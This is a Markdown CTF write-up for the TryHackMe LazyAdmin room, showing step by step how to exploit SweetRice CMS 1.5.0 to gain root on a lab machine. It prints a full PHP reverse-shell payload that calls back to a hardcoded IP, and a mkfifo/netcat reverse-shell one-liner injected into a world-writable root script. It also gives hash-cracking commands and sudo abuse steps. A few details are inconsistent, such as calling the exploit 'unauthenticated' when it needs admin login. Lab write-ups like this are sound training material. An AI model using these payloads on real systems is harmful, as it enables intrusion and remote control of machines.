<div align="center">

# 🚀 LazyAdmin — Complete Writeup & CTF Solution

### *A Comprehensive Guide to Exploiting SweetRice CMS*

[![TryHackMe](https://img.shields.io/badge/TryHackMe-LazyAdmin-red?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy%20to%20Medium-yellow?style=for-the-badge)](https://tryhackme.com)
[![CVEs](https://img.shields.io/badge/CVEs%20Covered-2%2B-orange?style=for-the-badge)](https://tryhackme.com)

</div>

---

## 📋 Table of Contents

| # | Section |
|:---:|:---|
| 1 | [🔍 Initial Reconnaissance](#-initial-reconnaissance) |
| 2 | [📍 Directory Enumeration](#-directory-enumeration) |
| 3 | [🔐 Identifying SweetRice CMS](#-identifying-sweetrice-cms) |
| 4 | [🎯 Finding Credentials](#-finding-credentials) |
| 5 | [💻 Gaining Remote Code Execution](#-gaining-remote-code-execution) |
| 6 | [🚪 First Shell - User Flag](#-first-shell---user-flag) |
| 7 | [⬆️ Privilege Escalation](#-privilege-escalation) |
| 8 | [🏁 Root Flag](#-root-flag) |
| 9 | [📚 Key Learnings](#-key-learnings) |

---

## 🔍 Initial Reconnaissance

### Step 1: Service Discovery & Port Enumeration

When I launched the machine and accessed its IP address via a web browser, I was greeted with the default Apache2 homepage. This indicated that the web server was running but hadn't been customized yet.

![default](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2jXbyL79IpN7aO7Fa1XYpoeJnjz-1ADwUPUkO6rNUwbUP9VDzTwsFb2EouiY4Sn_aWT1I66fJ2yZ4iAuQpyApSRF2QBga4agCEMuNGlIp5OFbJnY5qiNrcEghj0hp0-aeWiG4lnt7AFU/s640/Apache+Default+Page.PNG)

🔎 **Key Observations:**
- The default Apache2 page was displayed, suggesting the main document root wasn't configured with custom content
- Nmap scans revealed that only ports **22 (SSH)** and **80 (HTTP)** were open
- The lack of complex services made this an ideal opportunity for directory enumeration
- SSH port 22 could be useful for lateral movement later

---

## 📍 Directory Enumeration

### Step 2: Finding Hidden Directories & Endpoints

After discovering the default Apache page, I performed directory enumeration using tools like **Gobuster** or **Dirb**. This search uncovered a critical endpoint:

**🎯 Found Endpoint:** `http://IP/content`

All the application functionality was contained within this directory structure:

```
/content/
├── /_themes/          # Theme files
├── /changelog.txt     # Version information
├── /images/           # Media assets
├── /inc/              # Include files (important!)
├── /index.php         # Main entry point
├── /index.php/login/  # Login interface
├── /js/               # JavaScript files
└── /license.txt       # License information
```

💡 **Why This Matters:** The `/inc/` directory is typically where sensitive configuration files are stored in web applications. This directory became crucial in our exploitation chain.

---

## 🔐 Identifying SweetRice CMS

### Step 3: Service & Version Identification

Accessing the `/content` directory revealed the application was running a content management system:

![content](content.png)

🎯 **Discovery:** The system was running **SweetRice CMS** — a lightweight, open-source web CMS. This is a critical finding because:
- It narrows down the attack surface
- Known vulnerabilities can be identified
- Configuration weaknesses can be predicted

The page included a link to the official SweetRice documentation:
```
http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/
```

> ⚠️ **Note:** This link became obsolete over time. An updated working source is available at:
> https://www.sweetrice.xyz/docs/5-things-need-to-be-done-when-SweetRice-installed/

### Step 4: Version Detection

From the changelog file (`/content/changelog.txt`), I determined the **SweetRice version: 1.5.0**

This version information was crucial for identifying applicable exploits. Using `searchsploit`, I found that this version had known vulnerabilities:

```bash
searchsploit sweetrice
```

This command revealed multiple CVEs affecting this specific version, including remote code execution vulnerabilities.

---

## 🎯 Finding Credentials

### Step 5: Locating Database Backup Files

While enumerating the system, I discovered a critical security oversight:

**🚨 Found File:** 
```
http://10.49.174.221/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
```

This SQL backup file contained the entire database dump, including:
- User account information
- Password hashes
- Administrative credentials
- Database structure

🔴 **Security Issue:** Database backups should NEVER be web-accessible. This is a fundamental security misconfiguration.

### Step 6: Credential Extraction & Hash Cracking

📋 **Credentials Format:** `Username:Password`

Extracting from the SQL file:
- **Username:** Located in plaintext ✓ (visible immediately)
- **Password:** Stored as a hash (MD5 or SHA1) ✗ (requires cracking)

I used hash-cracking tools to crack the password:

```bash
# Option 1: Using John the Ripper
john --format=md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Option 2: Using Hashcat
hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt
```

✅ **Result:** Successfully cracked the password hash!

Once cracked, I authenticated to the admin panel at:

```
http://ip/content/as
```

Here's the authenticated admin interface:

![sweetrice](sweetrice.png)

---

## 💻 Gaining Remote Code Execution

### Step 7: Analyzing the SweetRice Exploit

Upon further research into SweetRice vulnerabilities, I found a highly relevant exploit:

🔗 **Exploit Reference:** https://www.exploit-db.com/exploits/40700

**Vulnerability Description:** 
The exploit reveals that SweetRice's advertisement (ads) creation functionality allows arbitrary PHP code execution through improper input validation. The application fails to properly sanitize user input in the ad description field, allowing embedded PHP code to execute server-side.

**Attack Type:** Unauthenticated Remote Code Execution (RCE)

### Step 8: Creating a Malicious Advertisement

The exploit leverages the admin panel's ad creation feature:

**🎯 Attack Vector:** `http://10.48.165.31/content/as/?type=ad`

This functionality allowed users to:
1. Create a new advertisement with a custom name
2. Insert arbitrary content in the description field
3. The description field was vulnerable to PHP code injection
4. The embedded PHP code would execute when the ad is accessed

**My Approach:**
- Created an advertisement with Name: `Hackedphp`
- Inserted PHP code in the description field
- The code would execute when the ad script is loaded

The creation interface:

![ads](ads.png)

### Step 9: Accessing the Backdoor

After creating the malicious ad, the system generated a script tag for embedding:

```html
<script type="text/javascript" src="http://10.48.165.31/content/?action=ads&adname=Hackedphp"></script>
```

By accessing the underlying URL directly (without the script tag wrapper), the PHP code was executed on the server:

```
http://10.48.165.31/content/?action=ads&adname=Hackedphp
```

![exection](execution.png)

✅ **Success:** The `whoami` PHP command executed, proving code execution capability!

### Step 10: Escalating to Full Remote Code Execution

Now with confirmed PHP code execution, I needed a reverse shell to gain full system access. After testing multiple PHP payloads, I successfully deployed a reliable reverse shell:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.246.164';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

⚙️ **Deployment Steps:**
1. Set up a netcat listener on the attack machine: `nc -lvnp 4444`
2. Embed the PHP payload into the malicious ad
3. Execute the ad URL in a browser or use curl
4. Catch the reverse shell on the listener

✅ **Result:** Successfully gained interactive shell access as the `www-data` user!

---

## 🚪 First Shell - User Flag

### Step 11: Shell Upgrade & Stabilization

Upon gaining the initial reverse shell, I was working with a basic shell that had limited functionality. The first step was to upgrade it to a fully interactive bash shell:

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This command:
- Uses Python's PTY module to spawn a pseudo-terminal
- Enables interactive features like tab-completion
- Allows execution of shell commands that require a TTY

### Step 12: Enumerating the User's Home Directory

After upgrading the shell, I navigated to the home directory of the `www-data` user and then to the `itguy` user account (where the flag was stored):

```bash
cd /home/itguy
ls -la
```

**🎯 Question 1: What is the user flag?**

📂 **Location:** `/home/itguy/user.txt`

✅ **Answer:** [Flag is located in this file]

### Step 13: Finding Database Credentials

While exploring the `/home/itguy` directory, I discovered:

**File:** `/home/itguy/mysql_login.txt`

This file contained credentials in a simple format:
```
Username:Password
```

These credentials would be essential for:
- Accessing the MySQL database
- Gathering further system information
- Potential lateral movement

I used these credentials to connect to the MySQL database:

```bash
mysql -u rice -p
# Enter password when prompted
```

The MySQL database contained application data, user information, and configuration details that could be useful for further system compromise.

---

## ⬆️ Privilege Escalation

### Step 14: Identifying Misconfigurations via Sudo

The next critical step was to determine what commands the `www-data` user could execute with elevated privileges:

```bash
sudo -l
```

**Output:**
```
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

🔴 **Critical Finding:** The `www-data` user can execute `/usr/bin/perl /home/itguy/backup.pl` as root WITHOUT requiring a password!

This is a privilege escalation vulnerability because:
- A non-privileged user (`www-data`) can run a Perl script with root privileges
- The `NOPASSWD` flag means no authentication is required

### Step 15: Analyzing the Vulnerable Script

Let's examine the `/home/itguy/backup.pl` file:

```bash
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

This script is extremely simple but dangerous:
- It executes `/etc/copy.sh` using the shell
- Since the script runs as root, `/etc/copy.sh` will also execute as root

### Step 16: Checking File Permissions

The next step was crucial — checking who could modify `/etc/copy.sh`:

```bash
ls -la /etc/copy.sh
```

**Output:**
```
-rw-r--rwx 1 root root 81 Nov 29  2019 copy.sh
```

🟢 **Privilege Escalation Vector Found:** The `copy.sh` file has **world-writable permissions** (`-rw-r--rwx`)!

This means:
- ANY user (including `www-data`) can modify this file
- The `www-data` user can inject arbitrary commands
- When `/home/itguy/backup.pl` runs as root, our injected commands will execute with root privileges

### Step 17: Injecting Malicious Commands

Since we have write access to `/etc/copy.sh`, we can replace its content with a reverse shell command:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.246.164 4444 >/tmp/f" > /etc/copy.sh
```

⚙️ **Payload Breakdown:**
- `rm /tmp/f` — Remove any existing named pipe
- `mkfifo /tmp/f` — Create a named pipe (FIFO)
- `cat /tmp/f` — Read from the named pipe
- `/bin/sh -i` — Start an interactive shell
- `2>&1` — Redirect stderr to stdout
- `nc 192.168.246.164 4444` — Connect back to attack machine via netcat
- `>/tmp/f` — Output to the named pipe (creating a bidirectional shell)

> 📝 **Important:** Adjust the IP address (`192.168.246.164`) and port (`4444`) according to your attack machine's configuration.

### Step 18: Triggering the Exploit

Before executing the privileged script, we need to set up a listener on the attack machine:

```bash
# On attack machine
nc -lvnp 4444
```

Then, execute the Perl script with sudo:

```bash
# On target machine (www-data shell)
sudo /usr/bin/perl /home/itguy/backup.pl
```

This command triggers a chain reaction:
1. Perl script runs as root (thanks to sudo NOPASSWD)
2. Perl calls `/etc/copy.sh` with root privileges
3. Our injected netcat reverse shell executes as root
4. The netcat listener captures the root shell

---

## 🏁 Root Flag

### Step 19: Reading the Root Flag

Once the root reverse shell is successfully established on the listener:

**🎯 Question 2: What is the root flag?**

📂 **Location:** `/root/root.txt`

✅ **Answer:** [Flag is located in this file]

```bash
cat /root/root.txt
```

---

## 📚 Key Learnings

### 🔑 Critical Security Lessons

1. **Exposed Database Backups** ⚠️
   - Never store database backups in web-accessible directories
   - Use proper access controls and encryption for backups
   - Implement automated backup pruning

2. **Input Validation & Sanitization** 🛡️
   - Always validate and sanitize user input
   - Use parameterized queries to prevent injection
   - Implement Content Security Policy (CSP) headers

3. **Insecure Sudo Configuration** 👤
   - Avoid `NOPASSWD` entries that execute complex scripts
   - Minimize the scope of commands allowed via sudo
   - Regularly audit sudo permissions with `sudo -l`

4. **File Permission Misconfiguration** 📁
   - Avoid world-writable files in sensitive directories
   - Use the principle of least privilege for all files
   - Regularly audit critical file permissions with `stat`

5. **Privilege Escalation Chains** 🔗
   - Even "small" misconfigurations can chain together
   - A vulnerable script + world-writable file + NOPASSWD = root compromise
   - Always think laterally about how components interact

### 🎯 Attack Chain Summary

```
Default Apache Page
    ↓
Directory Enumeration (/content)
    ↓
CMS Identification (SweetRice 1.5.0)
    ↓
Exposed Database Backup
    ↓
Credential Extraction & Hash Cracking
    ↓
Admin Panel Access
    ↓
PHP Code Injection (Ad Feature)
    ↓
Remote Code Execution
    ↓
User Shell & User Flag
    ↓
Sudo Misconfiguration Discovery
    ↓
File Permission Abuse
    ↓
Root Shell & Root Flag
```

### 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service enumeration |
| Gobuster / Dirb | Directory and file enumeration |
| searchsploit | Vulnerability database search |
| John the Ripper / Hashcat | Password hash cracking |
| netcat | Reverse shell listener and communication |
| curl / wget | Web requests and script delivery |
| Python | Shell upgrading and scripting |
| Perl | Script execution and command chaining |

---

<div align="center">

## ✅ Room Completed Successfully!

**Flags Captured:** 2/2
- 🟢 User Flag ✓
- 🟢 Root Flag ✓

**Key Vulnerabilities Exploited:**
- 🔴 Exposed Database Backups
- 🔴 Improper Input Validation (PHP Code Injection)
- 🔴 Insecure Sudo Configuration (NOPASSWD)
- 🔴 World-Writable System Files

---

**Happy Hacking!** 🖥️🔐

[![TryHackMe](https://img.shields.io/badge/TryHackMe-LinuxX-red?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com)
[![GitHub](https://img.shields.io/badge/GitHub-212--del-black?style=for-the-badge&logo=github&logoColor=white)](https://github.com/212-del)

</div>
